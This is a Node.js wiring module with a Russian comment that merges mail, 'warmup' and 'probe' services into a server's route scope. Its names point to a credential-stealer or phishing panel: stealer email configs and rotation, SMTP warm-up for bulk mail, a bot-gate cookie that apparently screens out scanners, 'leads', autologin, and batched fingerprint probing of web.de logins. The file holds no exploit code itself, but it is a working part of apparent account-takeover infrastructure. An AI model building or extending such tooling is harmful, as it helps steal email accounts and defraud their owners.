'use strict';

const path = require('path');
const gateMiddleware = require('./middleware/gateMiddleware');
const mailService = require('./services/mailService');
const warmupService = require('./services/warmupService');
const probeService = require('./services/probeService');

/**
 * Накладывает на базовый scope сервисный слой (почта / прогрев / probe / gate-константы).
 * База собирается в server.js из замыкания; сюда не переносятся лиды, скачивания, автологин.
 */
function mergeServiceRouteDeps(base) {
  const DATA_DIR = base.DATA_DIR;
  const PROJECT_ROOT = base.PROJECT_ROOT;
  return Object.assign({}, base, {
    BOT_GATE_COOKIE: gateMiddleware.BOT_GATE_COOKIE,
    hasGateCookie: gateMiddleware.hasGateCookie,
    parseSmtpLine: mailService.parseSmtpLine,
    parseSmtpLines: mailService.parseSmtpLines,
    readStealerEmailConfig: mailService.readStealerEmailConfig,
    writeStealerEmailConfig: mailService.writeStealerEmailConfig,
    readConfigEmail: mailService.readConfigEmail,
    writeConfigEmail: mailService.writeConfigEmail,
    CONFIG_EMAIL_SENT_EVENT_LABEL: mailService.CONFIG_EMAIL_SENT_EVENT_LABEL,
    leadHasAnyConfigEmailSentEvent: mailService.leadHasAnyConfigEmailSentEvent,
    sendConfigEmailToLead: mailService.sendConfigEmailToLead,
    stealerRotation: mailService.stealerRotation,
    sendStealerFailedSmtpEmails: mailService.sendStealerFailedSmtpEmails,
    CONFIG_EMAIL_FILE: path.join(DATA_DIR, 'config-email.json'),
    STEALER_EMAIL_FILE: path.join(DATA_DIR, 'stealer-email.json'),
    WARMUP_EMAIL_FILE: path.join(DATA_DIR, 'warmup-email.json'),
    WARMUP_SMTP_STATS_FILE: path.join(DATA_DIR, 'warmup-smtp-stats.json'),
    WARMUP_LOG_MAX: warmupService.WARMUP_LOG_MAX,
    readWarmupEmailConfig: warmupService.readWarmupEmailConfig,
    writeWarmupEmailConfig: warmupService.writeWarmupEmailConfig,
    readWarmupSmtpStats: warmupService.readWarmupSmtpStats,
    writeWarmupSmtpStats: warmupService.writeWarmupSmtpStats,
    warmupState: warmupService.warmupState,
    runWarmupStep: warmupService.runWarmupStep,
    WEBDE_PROBE_MAX_INDICES_PER_JOB: probeService.WEBDE_PROBE_MAX_INDICES_PER_JOB,
    WEBDE_FINGERPRINTS_JSON: path.join(PROJECT_ROOT, 'login', 'webde_fingerprints.json'),
    WEBDE_FP_INDICES_FILE: path.join(PROJECT_ROOT, 'login', 'webde_fingerprint_indices.txt'),
    WEBDE_PROBE_BATCH_SCRIPT: path.join(PROJECT_ROOT, 'login', 'webde_probe_batch.py'),
    readWebdeFingerprintsPoolMeta: probeService.readWebdeFingerprintsPoolMeta,
    readWebdeFingerprintsPoolArr: probeService.readWebdeFingerprintsPoolArr,
    summarizeWebdeFingerprintEntry: probeService.summarizeWebdeFingerprintEntry,
    buildWebdeFingerprintsListPayload: probeService.buildWebdeFingerprintsListPayload,
    readWebdeFpIndicesAllowedForProbe: probeService.readWebdeFpIndicesAllowedForProbe,
    pruneWebdeProbeJobs: probeService.pruneWebdeProbeJobs,
    webdeProbeScheduleContinue: probeService.webdeProbeScheduleContinue,
    webdeProbeRunOneBatch: probeService.webdeProbeRunOneBatch,
    handleWebdeFingerprintProbePause: probeService.handleWebdeFingerprintProbePause,
    handleWebdeFingerprintProbeResume: probeService.handleWebdeFingerprintProbeResume,
    handleWebdeFingerprintProbeStart: probeService.handleWebdeFingerprintProbeStart,
    sendWebdeFingerprintProbeStatus: probeService.sendWebdeFingerprintProbeStatus,
    webdeProbeJobs: probeService.webdeProbeJobs,
    webdeFpProbeCursor: probeService.webdeFpProbeCursor,
  });
}

module.exports = { mergeServiceRouteDeps };
